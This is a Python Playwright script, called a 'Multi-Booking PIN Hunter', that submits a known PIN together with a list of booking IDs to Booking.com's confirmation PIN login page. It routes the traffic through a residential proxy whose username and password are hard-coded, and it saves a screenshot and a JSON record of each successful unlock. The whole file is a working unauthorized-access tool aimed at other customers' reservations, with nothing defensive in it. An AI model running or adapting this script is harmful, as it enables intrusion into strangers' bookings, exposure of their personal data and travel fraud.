#!/usr/bin/env python3
"""
AUTOMATION SYSTEM - Multi-Booking PIN Hunter
Uses the discovered PIN pattern to test other booking IDs
"""

from playwright.sync_api import sync_playwright
import os
import time
import json
import threading
from datetime import datetime
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

# Configuration
KNOWN_SUCCESSFUL_PIN = None  # Will be loaded from targeted test results
HEADLESS = False  # Show browser for testing
WAIT_TIME = 3  # seconds between attempts
SCREEN_DIR = "screenshots_automation"
AUTOMATION_LOG = "automation_system_log.txt"

# Multiple booking IDs to test
BOOKING_IDS = [
    "6339614781",  # Your original booking ID
    "6763779197",  # Additional booking IDs
    "6763734263",
    # Add more booking IDs here as needed
]

# Proxy configuration
PROXY_CONFIG = {
    "server": "http://us-pr.oxylabs.io:10000",
    "username": "customer-phantomnet1_ONP6z",
    "password": "phantomnet1_ONP6z"
}

# Create directories
os.makedirs(SCREEN_DIR, exist_ok=True)

class AutomationSystem:
    def __init__(self):
        self.successful_pins = {}
        self.lock = threading.Lock()
        self.load_known_pin()
    
    def load_known_pin(self):
        """Load the successful PIN from targeted test"""
        success_file = "TARGETED_SUCCESS_5727559423.json"
        if os.path.exists(success_file):
            try:
                with open(success_file, 'r') as f:
                    data = json.load(f)
                global KNOWN_SUCCESSFUL_PIN
                KNOWN_SUCCESSFUL_PIN = data['success_pin']
                print(f"{Fore.GREEN}✅ Loaded known successful PIN: {KNOWN_SUCCESSFUL_PIN}{Style.RESET_ALL}")
            except:
                print(f"{Fore.RED}❌ Failed to load known PIN from targeted test{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}⚠️ No targeted test results found. Run targeted_pin_tester_5727559423.py first{Style.RESET_ALL}")
    
    def log_result(self, booking_id, pin, result, url, agent_name):
        """Log automation result"""
        with self.lock:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            log_entry = f"{timestamp},{booking_id},{agent_name},{pin},{result},{url}\n"
            
            with open(AUTOMATION_LOG, 'a', encoding='utf-8') as f:
                f.write(log_entry)
            
            if result == 'SUCCESS':
                self.successful_pins[booking_id] = pin
                self.save_success(booking_id, pin, agent_name, url)
    
    def save_success(self, booking_id, pin, agent_name, url):
        """Save successful result"""
        success_data = {
            'booking_id': booking_id,
            'success_pin': pin,
            'agent': agent_name,
            'timestamp': datetime.now().isoformat(),
            'url': url,
            'automation_system': True
        }
        
        success_file = f"AUTOMATION_SUCCESS_{booking_id}.json"
        with open(success_file, 'w') as f:
            json.dump(success_data, f, indent=2)
        
        self.display_automation_success(booking_id, pin, agent_name)
    
    def display_automation_success(self, booking_id, pin, agent_name):
        """Display automation success banner"""
        banner = f"""
{Fore.GREEN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                  🤖 AUTOMATION SUCCESS! 🤖                                   ║
║                                                                              ║
║  Booking ID: {booking_id}                                                    ║
║  Successful PIN: {pin}                                                     ║
║  Agent: {agent_name}                                                         ║
║  Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                  ║
║                                                                              ║
║              🚀 AUTOMATION SYSTEM WORKING! 🚀                               ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)
    
    def test_booking_id_with_pin(self, booking_id, pin, agent_name):
        """Test a specific booking ID with known PIN"""
        try:
            print(f"{Fore.YELLOW}[{agent_name}] Testing booking {booking_id} with PIN {pin}{Style.RESET_ALL}")
            
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=HEADLESS, proxy=PROXY_CONFIG)
                page = browser.new_page()

                try:
                    # Navigate to booking confirmation page
                    page.goto("https://secure.booking.com/help/confirmation_pin_auth", wait_until="load", timeout=30000)

                    # Fill in booking ID and PIN
                    page.wait_for_selector('input[placeholder="e.g. 1234567890"]', timeout=15000)
                    page.fill('input[placeholder="e.g. 1234567890"]', booking_id)
                    page.fill('input[placeholder="e.g. 1234"]', pin)

                    # Click Continue button
                    try:
                        page.wait_for_selector('button:has-text("Continue")', timeout=5000)
                        page.click('button:has-text("Continue")')
                    except Exception:
                        page.wait_for_selector('button[type="submit"]', timeout=5000)
                        page.click('button[type="submit"]')

                    # Wait for result
                    page.wait_for_function(
                        """
                        () => {
                            return location.href.includes('unique_order_id') ||
                                   document.querySelector('.bui-alert--error') !== null
                        }
                        """,
                        timeout=30000
                    )

                    current_url = page.url
                    
                    if "unique_order_id=" in current_url:
                        # SUCCESS!
                        page.screenshot(path=f"{SCREEN_DIR}/{booking_id}_{pin}_SUCCESS.png")
                        self.log_result(booking_id, pin, 'SUCCESS', current_url, agent_name)
                        print(f"{Fore.GREEN}🎉 SUCCESS! Booking {booking_id} works with PIN {pin}!{Style.RESET_ALL}")
                        return True
                        
                    elif page.query_selector('.bui-alert--error'):
                        # Failed
                        page.screenshot(path=f"{SCREEN_DIR}/{booking_id}_{pin}_FAIL.png")
                        self.log_result(booking_id, pin, 'FAILURE', current_url, agent_name)
                        print(f"{Fore.RED}❌ Booking {booking_id} failed with PIN {pin}{Style.RESET_ALL}")
                        return False
                        
                    else:
                        # Unknown result
                        page.screenshot(path=f"{SCREEN_DIR}/{booking_id}_{pin}_UNKNOWN.png")
                        self.log_result(booking_id, pin, 'UNKNOWN', current_url, agent_name)
                        print(f"{Fore.YELLOW}❓ Booking {booking_id} - unknown result{Style.RESET_ALL}")
                        return False
                        
                finally:
                    browser.close()
                    
        except Exception as e:
            error_msg = f'EXCEPTION: {str(e)[:200]}'
            self.log_result(booking_id, pin, error_msg, 'N/A', agent_name)
            print(f"{Fore.RED}💥 Exception testing booking {booking_id}: {str(e)[:100]}{Style.RESET_ALL}")
            return False

def main():
    """Main automation function"""
    automation = AutomationSystem()
    
    if not KNOWN_SUCCESSFUL_PIN:
        print(f"{Fore.RED}❌ No known successful PIN found!")
        print(f"{Fore.YELLOW}Please run targeted_pin_tester_5727559423.py first to find the correct PIN{Style.RESET_ALL}")
        return
    
    # Display startup banner
    print(f"""
{Fore.CYAN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                  🤖 AUTOMATION SYSTEM STARTING 🤖                            ║
║                                                                              ║
║  Known Successful PIN: {KNOWN_SUCCESSFUL_PIN}                                ║
║  Total Booking IDs: {len(BOOKING_IDS)}                                       ║
║  Wait time: {WAIT_TIME} seconds                                              ║
║  Strategy: Test known PIN against all booking IDs                          ║
║                                                                              ║
║                      🚀 AUTOMATION BEGINS! 🚀                               ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
""")
    
    # Test each booking ID with the known PIN
    for i, booking_id in enumerate(BOOKING_IDS, 1):
        print(f"\n{Fore.BLUE}📋 Testing booking {i}/{len(BOOKING_IDS)}: {booking_id}{Style.RESET_ALL}")
        
        # Check if already successful
        success_file = f"AUTOMATION_SUCCESS_{booking_id}.json"
        if os.path.exists(success_file):
            print(f"{Fore.GREEN}✅ Booking {booking_id} already successful{Style.RESET_ALL}")
            continue
        
        # Test with known PIN
        agent_name = f"AUTO_AGENT_{i}"
        automation.test_booking_id_with_pin(booking_id, KNOWN_SUCCESSFUL_PIN, agent_name)
        
        # Wait before next booking ID
        if i < len(BOOKING_IDS):
            print(f"{Fore.BLUE}⏱️ Waiting {WAIT_TIME} seconds before next booking...{Style.RESET_ALL}")
            time.sleep(WAIT_TIME)
    
    # Final report
    print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📊 AUTOMATION COMPLETE{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
    
    successful_bookings = len(automation.successful_pins)
    total_bookings = len(BOOKING_IDS)
    
    print(f"{Fore.GREEN}✅ Successful bookings: {successful_bookings}/{total_bookings}{Style.RESET_ALL}")
    
    if automation.successful_pins:
        print(f"{Fore.GREEN}🎯 Successful combinations:{Style.RESET_ALL}")
        for booking_id, pin in automation.successful_pins.items():
            print(f"  📋 {booking_id} → PIN: {pin}")
    
    print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}❌ Automation interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}💥 Unexpected error: {str(e)}{Style.RESET_ALL}")
